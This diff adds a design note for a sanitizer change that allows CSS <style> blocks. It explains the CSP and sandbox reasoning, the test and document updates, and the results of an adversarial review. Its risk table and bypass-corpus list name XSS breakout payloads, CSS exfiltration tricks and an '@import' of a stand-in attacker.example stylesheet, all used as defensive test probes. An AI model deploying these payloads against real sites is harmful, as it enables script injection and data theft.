@@ -1,0 +1,331 @@
+<h1>Supporting <code>&lt;style&gt;</code> blocks — design note</h1>
+<p><strong>Status:</strong> <strong>BUILT (sanitizer v1.4).</strong> <code>&lt;style&gt;</code> blocks are now allowed through the
+sanitizer; this note is the as-built record of the change and the risk analysis behind
+it. The verdict that justified shipping: under the render-time CSP + iframe sandbox,
+allowing <code>&lt;style&gt;</code> blocks is <strong>low marginal risk</strong> — the classic CSS attacks all depend
+on an external resource load that the CSP already forbids, and the one genuine residual
+(in-frame visual spoofing) is <em>already possible today</em> via inline <code>style="…"</code>. The
+posture shipped is <strong>verbatim CSS passthrough</strong> (rely on the CSP, do <strong>not</strong> add a CSS
+parser), consistent with how inline styles are already handled. The change is small and
+well-contained.</p>
+<p>This note follows the shape of <a href="/docs/source-retention-design" rel="noopener noreferrer" target="_blank"><code>source-retention-design.md</code></a>
+and <a href="/docs/byte-exact-publish-design" rel="noopener noreferrer" target="_blank"><code>byte-exact-publish-design.md</code></a>: motivation → current
+state → mechanism → risk → as-built changes → recommendation.</p>
+<hr>
+<h2>1. Motivation</h2>
+<p>Today every visual rule must live in an inline <code>style="…"</code> attribute — <code>&lt;style&gt;</code>
+blocks are stripped (§3). An inline attribute is a single element's declaration
+block; it has no selector context, so an entire class of CSS is unreachable:</p>
+<ul>
+<li><strong><code>class</code>-driven theming</strong> — no shared rule reused across many elements; every
+element repeats its full style string. A "design system" (color roles, a type
+scale, card/surface treatments) can't be expressed once and applied by class.</li>
+<li><strong>Pseudo-classes / pseudo-elements</strong> — <code>:hover</code>, <code>:focus</code>, <code>::before</code>, <code>::after</code>,
+<code>::marker</code>. None can exist in an inline attribute.</li>
+<li><strong><code>@media</code></strong> — no breakpoint-based responsive layout (responsiveness must be
+<em>intrinsic</em>: CSS grid <code>auto-fit</code>, <code>flex-wrap</code>, <code>max-width</code>, <code>clamp()</code>).</li>
+<li><strong><code>@keyframes</code> + transitions</strong> — no animation or motion layer.</li>
+<li><strong><code>prefers-color-scheme</code></strong> — no author-controlled light/dark adaptation.</li>
+<li><strong><code>@font-face</code> with <code>data:</code> fonts</strong> — a custom font embedded as a <code>data:</code> URI
+(allowed by <code>font-src … data:</code>) needs an <code>@font-face</code> rule, which needs <code>&lt;style&gt;</code>.</li>
+</ul>
+<p>Allowing <code>&lt;style&gt;</code> unlocks all of the above. <strong>What stays impossible regardless</strong>
+(so expectations stay honest): no JavaScript (sandbox has no <code>allow-scripts</code>), no
+real form controls (<code>&lt;button&gt;</code>/<code>&lt;input&gt;</code>/<code>&lt;form&gt;</code> are stripped — "buttons" are
+styled <code>&lt;a&gt;</code> links; the only native interactivity is <code>&lt;details&gt;</code>/<code>&lt;summary&gt;</code> and
+in-page <code>#anchor</code> links), and <strong>no external images or fonts</strong> (CSP blocks every
+external origin). <code>&lt;style&gt;</code> is the <em>expressiveness</em> unlock for the static visual
+language, not an interactivity or networking unlock.</p>
+<h2>2. Starting state (before v1.4)</h2>
+<ul>
+<li>
+<p><strong><code>&lt;style&gt;</code> is stripped tag-and-content.</strong> It sits in ammonia's default
+<code>clean_content_tags</code> blocklist <code>{script, style}</code> (verified against the vendored
+ammonia 4.1.2 source), so both the tag <em>and</em> its CSS text are removed. It is not
+in the tag allowlist (<code>make_builder()</code>, <code>sanitizer/src/lib.rs</code>). The module
+doc-comment names it explicitly as a deliberate strip (<code>sanitizer/src/lib.rs:27</code>).</p>
+</li>
+<li>
+<p><strong>Inline <code>style="…"</code> is already allowed</strong> on any element (via ammonia defaults +
+the <code>style</code> entry in <code>SVG_GENERIC_ATTRS</code>). The sanitizer does <strong>not</strong> parse the CSS
+inside it — <code>url(javascript:…)</code> in an inline style survives sanitization <em>by
+design</em> and is neutralized at the render wall, not the sanitizer (this is already
+stated as an explicit non-guarantee in <a href="/docs/security-model" rel="noopener noreferrer" target="_blank"><code>../security-model.md</code></a>,
+"Inline-<code>style</code> CSS is not deep-parsed").</p>
+</li>
+<li>
+<p><strong>The render-time CSP already permits <code>&lt;style&gt;</code> blocks.</strong> <code>RAW_CSP</code>
+(<code>src/serve.ts</code>, the policy on <code>GET /d/:id/raw</code>, the bytes the iframe loads) is:</p>
+<pre><code>default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline' data:;
+font-src 'self' data:; frame-ancestors 'self'; base-uri 'none'; form-action 'none'
+</code></pre>
+<p><code>style-src 'unsafe-inline'</code> covers <strong>both</strong> inline <code>style="…"</code> attributes <strong>and</strong>
+<code>&lt;style&gt;</code> elements — so <strong>allowing <code>&lt;style&gt;</code> requires no CSP change, ever.</strong> The
+iframe <code>SANDBOX</code> (<code>src/serve.ts</code>) is <code>allow-popups allow-popups-to-escape-sandbox</code>
+— <strong>no</strong> <code>allow-scripts</code>, <strong>no</strong> <code>allow-same-origin</code>.</p>
+</li>
+<li>
+<p><strong>The Markdown text channel already drops CSS.</strong> <code>html_to_markdown</code>
+(<code>sanitizer/src/markdown.rs:119</code>) emits nothing for <code>script | style | noscript</code>, so
+reading a <code>&lt;style&gt;</code>-bearing doc with <code>read_document format:"markdown"</code> (or <code>/text</code>)
+won't surface CSS as document text. No change needed there.</p>
+</li>
+</ul>
+<p>The net: the render wall is <em>already</em> configured for <code>&lt;style&gt;</code>; only the sanitizer
+(Wall 2) removes it, as cheap insurance.</p>
+<h2>3. Mechanism (the recipe core)</h2>
+<p><strong>Ammonia change</strong> — two calls in <code>make_builder()</code> (<code>sanitizer/src/lib.rs</code>):</p>
+<ol>
+<li>Add <code>"style"</code> to the <code>EXTRA_TAGS</code> const (<code>sanitizer/src/lib.rs:60</code>), which flows
+into the existing <code>b.add_tags(extra)</code> at <code>sanitizer/src/lib.rs:125</code>.</li>
+<li>Add, right after it: <code>b.rm_clean_content_tags(["style"]);</code></li>
+</ol>
+<p><strong>The gotcha — record this loudly.</strong> Ammonia <strong>panics at <code>clean()</code> time</strong> if a tag
+is present in <em>both</em> the allowlist and <code>clean_content_tags</code>. So <code>add_tags(["style"])</code>
+<strong>alone is a bug</strong> — it would WASM-trap on the <em>first</em> <code>sanitize()</code> call (i.e. the
+first write or test). The <code>rm_clean_content_tags(["style"])</code> is mandatory and must
+accompany the <code>add_tags</code>. The order of the two calls within <code>make_builder()</code> doesn't
+matter (the check runs at <code>clean()</code>, not at builder-config time), but both must be
+present. <strong>Verify fast:</strong> <code>(cd sanitizer &amp;&amp; cargo test keeps_inert_style_block)</code> —
+the first surviving-<code>&lt;style&gt;</code> test that runs catches the panic immediately.</p>
+<p><strong>Verbatim CSS passthrough (the chosen posture).</strong> The CSS inside a surviving
+<code>&lt;style&gt;</code> flows through <strong>unparsed</strong>. Defense against CSS-based vectors is the CSP +
+sandbox (Wall 1), not the sanitizer — exactly the posture already in force for inline
+<code>style="…"</code>. We <strong>do not</strong> add a CSS parser or a property allowlist: the project
+deliberately avoids parsing CSS, and the egress/exfil vectors are already CSP-blocked
+(§4), so a defensive CSS pass would be largely redundant scope. (The structural-CSS
+alternative is the documented <em>deferred</em> mitigation — §6.)</p>
+<p><strong>Raw-text breakout safety.</strong> html5ever parses <code>&lt;style&gt;</code> as a <strong>raw-text element</strong>:
+its content is tokenized as RAWTEXT and terminated only by the literal <code>&lt;/style&gt;</code>.
+Consequently a <em>parsed</em> <code>&lt;style&gt;</code> text node can never itself contain the substring
+<code>&lt;/style&gt;</code>. On re-serialization ammonia emits that text node verbatim between
+<code>&lt;style&gt;…&lt;/style&gt;</code>; because the node can't contain <code>&lt;/style&gt;</code>, single-pass
+serialization cannot be tricked into closing the element early and injecting markup
+after it. Anything an author wrote <em>after</em> a <code>&lt;/style&gt;</code> in the source was already
+parsed as sibling content — and sanitized as such — before serialization. This is
+why no second sanitize pass is needed; the corpus vectors in §6 prove it empirically.</p>
+<h2>4. Risk analysis (the honest part)</h2>
+<p>Walking each CSS attack class and why it is neutralized <strong>here</strong> (static doc, no
+scripts, no inputs, strict CSP):</p>
+<table><thead><tr><th>Vector</th><th>Why it's dead here</th></tr></thead><tbody>
+<tr><td>Exfil via <code>background:url(//evil/…)</code> or attribute-selector keylogger (<code>input[value^="a"]{…}</code>)</td><td>Needs (a) an <strong>external load</strong> — <code>img-src 'self' data:</code> blocks it — <strong>and</strong> (b) a DOM secret / real <code>&lt;input&gt;</code> to leak — none survive sanitization. <strong>Doubly dead.</strong> And a published doc has nothing secret in its DOM.</td></tr>
+<tr><td><code>@import url(//evil/…)</code> of remote CSS</td><td><code>style-src 'unsafe-inline' data:</code> lists <strong>no external origin</strong> (not even <code>'self'</code>). Blocked.</td></tr>
+<tr><td><code>@font-face { src: url(//evil/…) }</code></td><td><code>font-src 'self' data:</code> — no external origin. Blocked. (A <code>data:</code> font <em>is</em> allowed — that's the feature, self-contained, no egress.)</td></tr>
+<tr><td><code>:visited</code> history sniffing</td><td>Browsers neutered <code>:visited</code> styling years ago + no external load to observe. Dead.</td></tr>
+<tr><td>IE <code>expression()</code> / old-Firefox <code>-moz-binding:url(…)</code> (the historical CSS→script vectors)</td><td>Removed from modern browsers; both also need an external load and there is no <code>allow-scripts</code>. Dead.</td></tr>
+<tr><td>Resource exhaustion (pathological <code>@keyframes</code>, deeply nested selectors)</td><td>Client-side only (the viewer's own tab); bounded by the 5 MiB body cap. CSS is <strong>not</strong> parsed server-side (ammonia passes it through), so no server-side ReDoS surface.</td></tr>
+</tbody></table>
+<p><strong>The one genuine residual: CSS UI-redress / visual spoofing.</strong> <code>position:fixed</code>
+overlays, fake UI, <code>content:</code>-injected glyphs — a coordinated overlay that makes a
+<strong>forced outbound <code>&lt;a&gt;</code> link</strong> look like a benign button. Two things bound it:</p>
+<ul>
+<li>It is <strong>already possible today</strong> with inline <code>style="…"</code> on a single large
+element. <code>&lt;style&gt;</code> makes <em>coordinated, multi-element</em> overlays <strong>easier</strong>, not
+<strong>newly possible</strong>. The capability delta is convenience, not kind.</li>
+<li>The render wall confines the damage: the iframe is sandboxed (no script, no
+same-origin) and <code>frame-ancestors 'self'</code> closes clickjacking <em>of</em> the document.
+The residual is purely <strong>in-frame visual spoofing</strong>, and navigation is the one
+egress the CSP can't close (a link the user chooses to click).</li>
+</ul>
+<p>This is precisely the residual the <strong>PLATFORM v2 spec already names and accepts</strong> for
+the full-CSS tier — see <a href="/docs/spec-platform" rel="noopener noreferrer" target="_blank"><code>agent-knowledge-host-spec-PLATFORM-v2.md</code></a>
+§6.7 ("CSS is allowed, with egress closed at the CSP layer"), which both closes the
+egress vectors at the CSP and accepts the UI-redress overlay as a documented residual
+"because the audience is private and principal-gated," to be revisited pre-public.
+<strong>Allowing <code>&lt;style&gt;</code> in SOLO converges toward the PLATFORM stance</strong> rather than
+diverging from it — the PLATFORM blueprint already contemplated "all CSS."</p>
+<p><strong>Defense-in-depth note (the philosophical shift).</strong> With <code>&lt;style&gt;</code> allowed, the
+sanitizer stops being even "cheap insurance" for CSS — Wall 1 (CSP + sandbox) carries
+the CSS threat model <strong>entirely</strong>. This is consistent with the <em>already-stated</em>
+posture (<a href="/docs/security-model" rel="noopener noreferrer" target="_blank"><code>../security-model.md</code></a>: "CSS-based vectors are Wall
+1's responsibility, not the sanitizer's"). <code>&lt;style&gt;</code> only widens the surface from
+per-element inline declarations to document-level sheets with selectors — it does not
+introduce a new trust boundary, and the bypass corpus's predicate is already scoped to
+treat CSS <em>content</em> as out of scope (it checks the element tree for script-execution
+sinks, not CSS values).</p>
+<h2>5. Why this is safe to ship as-is</h2>
+<ul>
+<li><strong>No CSP change</strong> — <code>style-src 'unsafe-inline'</code> already permits <code>&lt;style&gt;</code> (§2).</li>
+<li><strong>No new network surface</strong> — <code>default-src 'none'</code> + <code>'self' data:</code> source lists
+already block every external load CSS can attempt (§4).</li>
+<li><strong>No script surface</strong> — sandbox has no <code>allow-scripts</code>; CSS cannot execute JS in
+any modern browser.</li>
+<li><strong>No text-channel leak</strong> — the Markdown projection already drops <code>&lt;style&gt;</code> (§2).</li>
+<li><strong>No mXSS via serialization</strong> — html5ever raw-text handling makes a <code>&lt;/style&gt;</code>
+breakout impossible in a single pass (§3), proven by the corpus vectors in §6.</li>
+</ul>
+<h2>6. Implementation (as built)</h2>
+<p>File-by-file, as shipped in sanitizer v1.4. Per <code>CLAUDE.md</code>'s same-commit sync rule,
+the code and every doc below landed together. (Implementation detail: rather than fold
+<code>"style"</code> into <code>EXTRA_TAGS</code>, the build added a dedicated <code>STYLESHEET_TAGS</code> const that is
+both added to the tag allowlist and passed to <code>rm_clean_content_tags</code> — functionally
+identical to the recipe below, and self-documenting about the two-step requirement.)</p>
+<p><strong>Sanitizer (<code>sanitizer/src/lib.rs</code>).</strong></p>
+<ul>
+<li>Add <code>"style"</code> to <code>EXTRA_TAGS</code> (<code>:60</code>) and <code>b.rm_clean_content_tags(["style"]);</code>
+after <code>b.add_tags(extra)</code> (<code>:125</code>) — §3. Confirm the argument form compiles
+(<code>["style"]</code> vs <code>&amp;["style"]</code> — match the ammonia doc-test signature).</li>
+<li>Bump <code>sanitizer_version()</code> (<code>:193</code>) → <code>"ammonia-v1.4"</code> with a comment-block line
+in the existing convention: <em>"v1.4 — allow <code>&lt;style&gt;</code> blocks: add <code>style</code> to the tag
+whitelist and lift it from ammonia's <code>clean_content_tags</code>; inert under sandbox +
+CSP, CSS is the render wall's responsibility (same as inline <code>style</code>)."</em></li>
+<li>Drop the "<code>&lt;style&gt;</code> blocks — CSS-injection surface…" bullet from the module
+doc-comment (<code>:27</code>); optionally add a one-line note under "What we add on top of
+ammonia defaults."</li>
+<li>Rewrite the two stripping tests <code>strips_style_block_with_js_url</code> (<code>:683</code>) and
+<code>strips_style_block_with_import</code> (<code>:690</code>) into <strong>survive-but-inert</strong> tests:
+<code>keeps_inert_style_block</code> (a plain <code>&lt;style&gt;</code> + its CSS survive), and breakout
+proofs — <code>&lt;style&gt;&lt;/style&gt;&lt;script&gt;…</code>, <code>&lt;style&gt;x{}&lt;/style&gt;&lt;img src=x onerror=…&gt;</code>,
+and a comment/CDATA close trick (<code>&lt;style&gt;/*&lt;/style&gt;*/&lt;img … onerror=…&gt;</code>) — each
+asserting <code>&lt;style&gt;</code> survives but <strong>no</strong> <code>&lt;script</code>/<code>onerror</code> does. Add a
+<code>contract_style_block_survives</code> pin in the publishing-contract test block so an
+ammonia upgrade that re-adds <code>style</code> to <code>clean_content_tags</code> fails loudly.</li>
+</ul>
+<p><strong>Bypass corpus (<code>sanitizer/tests/bypass_corpus.rs</code> + <code>corpus/</code>).</strong></p>
+<ul>
+<li>Remove <code>"style"</code> from <code>DANGEROUS_TAGS</code> (<code>:84</code>) — a surviving inert <code>&lt;style&gt;</code> is no
+longer a sink and must not false-positive; a real <code>&lt;/style&gt;</code> breakout still surfaces
+as a <code>script</code> element / <code>on*</code> attr, which the predicate still catches.</li>
+<li>Add a third "intentionally OUT of scope" bullet to the predicate scope-note:
+<strong><code>&lt;style&gt;</code>-block CSS content</strong>, same rationale as inline <code>style</code> (CSP's job; the
+predicate inspects the element tree, not CSS text).</li>
+<li>Add an inert-<code>&lt;style&gt;</code> benign case to <code>predicate_self_check</code> so a future re-add of
+<code>style</code> to <code>DANGEROUS_TAGS</code> (which would re-introduce a false positive on
+legitimate output) trips the self-check.</li>
+<li>Append breakout/egress vectors to <code>corpus/bypasses.txt</code> (all must yield no live
+element/handler; the inert/egress ones survive as inert CSS):
+<code>&lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ·
+<code>&lt;style&gt;x{}&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</code> ·
+<code>&lt;style&gt;/*&lt;/style&gt;*/&lt;script&gt;alert(1)&lt;/script&gt;</code> ·
+<code>&lt;style&gt;&lt;![CDATA[&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ·
+<code>&lt;svg&gt;&lt;style&gt;.a{}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code> ·
+<code>&lt;math&gt;&lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/math&gt;</code> ·
+<code>&lt;xmp&gt;&lt;/xmp&gt;&lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ·
+<code>&lt;style&gt;@import url("https://attacker.example/leak.css");&lt;/style&gt;</code> (survives inert)
+· <code>&lt;style&gt;*{position:fixed}&lt;/style&gt;&lt;a href="https://attacker.example"&gt;x&lt;/a&gt;</code>
+(survives inert — the named UI-redress residual). Note provenance in
+<code>corpus/SOURCES.md</code> (<code>awh-style-surface</code>, hand-authored probes of <em>our</em> allowance).</li>
+</ul>
+<p><strong>Advisories (<code>src/advisories.ts</code> + <code>test/advisories.test.mjs</code>).</strong></p>
+<ul>
+<li>Delete the <code>&lt;style&gt;</code> <code>STRIPPED_RULES</code> entry (<code>src/advisories.ts:205</code>) — <code>&lt;style&gt;</code>
+no longer disappears, so the rule would never fire. Keep the adjacent
+<code>&lt;link rel=stylesheet&gt;</code> rule (external sheets are still stripped).</li>
+<li>Remove <code>"style"</code> from <code>SPECIFICALLY_COVERED</code> (<code>src/advisories.ts:170</code>); keep
+<code>"link"</code>. Keep <code>stripNoise</code>'s <code>&lt;style&gt;</code>-body strip (<code>src/advisories.ts:132</code>) — it
+still wants to avoid counting tag names inside CSS text.</li>
+<li>Swap the <code>&lt;style&gt;</code> example in the module doc-comment for a still-stripped one, and
+<strong>fix the now-false <code>WILL_NOT_RENDER_RULES</code> comment</strong> (it currently claims external
+CSS can't survive because <code>&lt;style&gt;</code>/<code>&lt;link&gt;</code> are stripped — untrue once <code>&lt;style&gt;</code>
+is allowed).</li>
+<li><strong>Add the external-CSS <code>will_not_render</code> advisory</strong> (the chosen warning): a
+heuristic over the cleaned output —
+<code>match: /@import\b|url\(\s*['"]?https?:/i</code> — message that the iframe CSP
+(<code>style/img/font-src 'self' data:</code>) blocks the load, so inline the CSS or use a
+<code>data:</code> URL. CSS isn't parsed, so this is best-effort; false negatives acceptable.</li>
+<li>Update <code>test/advisories.test.mjs:19</code> (the "style stripped" case): replace with a
+<strong>survive</strong> case (<code>&lt;style&gt;</code> preserved → nothing reported stripped) plus a
+<code>will_not_render</code> case for <code>&lt;style&gt;@import url("https://…")&lt;/style&gt;</code>.</li>
+</ul>
+<p><strong>Render comment only (<code>src/serve.ts</code>).</strong> <code>RAW_CSP</code> needs <strong>no behavior change</strong>;
+correct the explanatory comment (it currently says the sanitizer strips <code>&lt;style&gt;</code>).</p>
+<p><strong>Contract docs (same commit).</strong></p>
+<ul>
+<li><a href="/docs/publishing-guide" rel="noopener noreferrer" target="_blank"><code>../../skills/publishing.md</code></a> "CSS rules" section — the
+biggest rewrite: TL;DR (<code>class</code>-driven theming etc. now possible) + the allowlist
+table (<code>&lt;style&gt;</code> <strong>allowed</strong>; <code>&lt;link&gt;</code> still <strong>stripped</strong>; <code>@import</code>/external
+<code>url()</code> survive but <strong>CSP-blocked</strong> → cross-ref the new advisory; <code>@font-face</code> with
+<strong><code>data:</code></strong> fonts now possible, external fonts blocked); flip the <code>&lt;style&gt;</code> line in
+the "stripped silently" example to a "works" example.</li>
+<li><a href="/docs/security-model" rel="noopener noreferrer" target="_blank"><code>../security-model.md</code></a> — remove <code>&lt;style&gt;</code> from the Wall 2
+strip list; extend the inline-<code>style</code> non-guarantee to cover <code>&lt;style&gt;</code> blocks; add
+one sentence on the UI-redress residual (forward-ref §6.7 + this note).</li>
+<li><a href="/docs/spec-solo" rel="noopener noreferrer" target="_blank"><code>agent-knowledge-host-spec-SOLO-v1.md</code></a> —
+light touch the sanitize-and-serve prose if any sentence asserts <code>&lt;style&gt;</code> is
+stripped; add a one-line as-built note. <strong>PLATFORM v2 is frozen</strong> — review only;
+SOLO converges toward §6.7, so no lineage edit is expected.</li>
+<li><code>src/mcp.ts</code> — fix the "static-HTML non-negotiables" CSS line in the write-tool
+descriptions (currently "all styling must be INLINE…"; → "inline <code>style</code> <strong>or</strong>
+<code>&lt;style&gt;</code> blocks; external stylesheets/resources blocked"). Keep terse
+(non-negotiables-first; trimmed renders truncate the tail).</li>
+<li><code>CLAUDE.md</code> — drop <code>&lt;style&gt;</code> from the sanitizer strip-list bullet; add <code>&lt;style&gt;</code> +
+<strong>the panic-on-overlap gotcha</strong> to the ammonia-defaults bullet; extend the
+bypass-corpus out-of-scope bullet.</li>
+<li><a href="/docs/http-api" rel="noopener noreferrer" target="_blank"><code>../http-api.md</code></a> — <strong>no tag-list edit</strong> (it delegates authoring
+rules to <code>publishing.md</code>).</li>
+</ul>
+<p><strong>Publishing (when shipped).</strong> Nothing separate to publish: since issue #4 the
+affected pages — <code>/docs/publishing-guide</code>, <code>/docs/security-model</code>,
+<code>/docs/spec-solo</code> if edited, and <strong>this note</strong> at <code>/docs/style-support-design</code> —
+are built from their repo files by <code>npm run build:docs</code> and served by the
+Worker.</p>
+<p><strong>Verification when shipped.</strong> <code>(cd sanitizer &amp;&amp; cargo test keeps_inert_style_block)</code>
+first (catches the panic-on-overlap fast) → <code>npm run test:sanitizer</code> → <code>npm test</code> →
+<code>npm run typecheck</code> → <code>npm run build:wasm</code> → <code>wrangler dev</code> E2E: publish an HTML doc
+with a <code>&lt;style&gt;</code> block using <code>:hover</code> / <code>@media</code> / <code>@keyframes</code> / <code>prefers-color-scheme</code>,
+load <code>/d/:id/raw</code>, confirm styles apply; publish one with <code>@import</code> + an external
+<code>url(http…)</code> background and confirm devtools shows the fetch <strong>CSP-blocked</strong> and the
+write response <code>will_not_render[]</code> flagged it; confirm a <code>data:</code> <code>@font-face</code> loads.</p>
+<h2>7. Recommendation &amp; deferred</h2>
+<p><strong>Shipped with verbatim CSS passthrough</strong> (§3): small, well-contained, no CSP change,
+consistent with the existing inline-style posture, and it converges SOLO toward
+PLATFORM §6.7.</p>
+<p><strong>Deferred</strong> — a <strong>structural CSS allowlist / CSS property sanitizer</strong> that could
+forbid e.g. fixed-position overlays over interactive elements. This is the PLATFORM
+§6.7 pre-public mitigation; it is genuine engineering (a markup sanitizer like ammonia
+does not parse CSS property values structurally), explicitly <strong>not</strong> a cheap toggle,
+and only matters once arbitrary strangers can be lured to a document. Until the threat
+model widens to a public/adversarial audience, the UI-redress residual is <strong>tracked
+and accepted</strong>, not closed — the same disposition PLATFORM §6.7 records.</p>
+<h2>8. Findings from the adversarial review</h2>
+<p>Shipping v1.4 was gated on a multi-agent adversarial pass (mXSS/RAWTEXT serialization,
+SVG/MathML namespace confusion, CSP-exfiltration, and panic/DoS/read-path lenses), each
+building a throwaway host harness and running the <em>real</em> sanitizer over dozens of vectors.</p>
+<p><strong>Cleared (no breakout/exfil).</strong> The core safety claim held empirically. The load-bearing
+invariant: html5ever serializes a <code>&lt;style&gt;</code> text node <strong>un-escaped</strong> (RAWTEXT) <em>only</em> for an
+<strong>HTML-namespace</strong> <code>&lt;style&gt;</code>, and the tokenizer guarantees such a node can never contain a
+literal <code>&lt;/style&gt;</code> — so single-pass serialization can't be tricked into an early close. An
+SVG/MathML-namespaced <code>&lt;style&gt;</code> serializes <strong>escaped</strong>, and ammonia's <code>check_expected_namespace</code>
+drops any element that switched namespace unexpectedly. Our allowlist has <strong>zero MathML tags</strong>
+and denies <code>&lt;foreignObject&gt;</code>, which collapses the highest-value integration-point divergences
+(e.g. <code>annotation-xml encoding="text/html"</code>) to the empty string. Under the exact <code>RAW_CSP</code>,
+no <code>&lt;style&gt;</code>-borne external load or data-exfiltration channel exists (no external origin in any
+directive; the doc is static with no secrets/inputs; <code>'self'</code>/<code>data:</code> carry no secret-derived
+signal). The residual remains exactly the §4 in-frame UI-redress. New integration-point tripwire
+vectors were added to <code>corpus/bypasses.txt</code> (<code>awh-style-surface</code>).</p>
+<p><strong>Pre-existing issue surfaced (NOT a <code>&lt;style&gt;</code> regression): read-path converter recursion.</strong>
+<code>sanitizer/src/markdown.rs</code> recurses without a depth bound across <strong>three</strong> sites
+(<code>Emitter::walk</code>/<code>walk_children</code>, <code>emit_svg</code>'s <code>search</code>, <code>collect_text</code>'s <code>walk</code>). A
+pathologically deep DOM (e.g. <code>&lt;div&gt;</code>×80k — <strong>no <code>&lt;style&gt;</code> needed</strong>) passes <code>sanitize()</code>
+(ammonia uses an explicit work-stack) and stays under the 5 MiB cap, but overflows the small
+(~1 MiB) <strong>WASM</strong> stack at ~10k nesting (~110 KB input) and <strong>hard-aborts the isolate</strong>. It
+fires at write time (the FTS-body <code>htmlToMarkdown</code>, before the D1 batch — so the doc is <em>not</em>
+stored) and on every markdown read. Because the same converter runs at write, a depth-bomb can't
+be <em>persisted</em> to crash other readers — the realistic impact is a write-time, self-inflicted,
+authenticated, single-tenant request-level DoS (a hard abort, the worst failure mode). v1.4 only
+<em>eases</em> hitting it (a compact <code>&lt;svg&gt;&lt;style&gt;</code> nesting primitive); it does not introduce it.
+<strong>Disposition:</strong> <strong>ADDRESSED</strong> (<a href="https://github.com/Skylled/slopcafe/issues/41" rel="noopener noreferrer" target="_blank">GitHub issue #41</a>,
+separate commit) via the <strong>reject-at-write</strong> option. The write path now measures the sanitized
+render's nesting depth with a new <strong>iterative</strong> (stack-safe) <code>max_dom_depth</code> and returns
+<code>too_deep</code> (HTTP 422) past <code>MAX_DOM_DEPTH</code> (512) — <em>before</em> the recursive <code>htmlToMarkdown</code> ever
+runs. So a depth-bomb can never reach the converter (at write) or storage (and thus never a read),
+which closes the hard-abort for new documents; pre-existing docs are storable, hence already
+below the overflow, so they read safely too. The alternative — bounding recursion in the converter
+itself — was not taken: rejection is simpler and makes the depth-bomb a clean 422 instead of a
+silent truncation. <strong>Perf follow-up (<a href="https://github.com/Skylled/slopcafe/issues/42" rel="noopener noreferrer" target="_blank">#42</a>, separate
+commit):</strong> the precise <code>max_dom_depth</code> <em>and</em> <code>sanitize()</code> are themselves ~O(n²) in nesting (both
+build + drop an html5ever/<code>RcDom</code> tree), so a near-byte-cap bomb still burned seconds before the
+422 fired. A cheap O(n) byte-scan (<code>maxNestingDepth</code>, <code>src/depth.ts</code>) now runs <strong>first</strong> — on the
+cheaply-converted HTML (pulldown-cmark is O(n)), <em>before</em> <code>sanitize()</code> — and refuses a bomb
+~1000× faster (9 ms vs ~58 s at depth 50k); <code>max_dom_depth</code> stays the authoritative post-sanitize
+guard, now always on shallow, pre-screened input. The <code>&lt;select&gt;</code>/<code>&lt;noscript&gt;</code> text-leak below was a
+<em>separate</em> finding, addressed in turn (next).</p>
+<p><strong>Pre-existing text-leak via parser-special containers — ADDRESSED (#41, sanitizer v1.5).</strong>
+In the <code>&lt;select&gt;</code> and <code>&lt;noscript&gt;</code> parser contexts, would-be-<code>&lt;style&gt;</code> content is parsed as plain
+text (never a <code>&lt;style&gt;</code> element). Crucially the orphaned text ends up in <strong>H itself</strong> — so it's
+<em>visible in the render</em>, not just the markdown/FTS channel (e.g. <code>&lt;select&gt;&lt;style&gt;.x{color:red} &lt;/style&gt;&lt;/select&gt;</code> sanitized to the bare text <code>.x{color:red}</code>). The fix drops the <strong>content</strong> of
+these non-allowed, parser-special containers (<code>&lt;noscript&gt;</code>/<code>&lt;select&gt;</code>/<code>&lt;textarea&gt;</code>) by adding them
+to ammonia's <code>clean_content_tags</code> (<code>DROP_CONTENT_TAGS</code> in <code>make_builder</code>, joining the default
+<code>script</code>), so their RAWTEXT/insertion-mode-mangled text can't survive as escaped/orphaned markup.
+Non-security (render was H-only behind the CSP; the leak was visible-text/search pollution, not
+XSS), but a real correctness wart. Bumped <code>sanitizer_version</code> → <code>ammonia-v1.5</code>.</p>
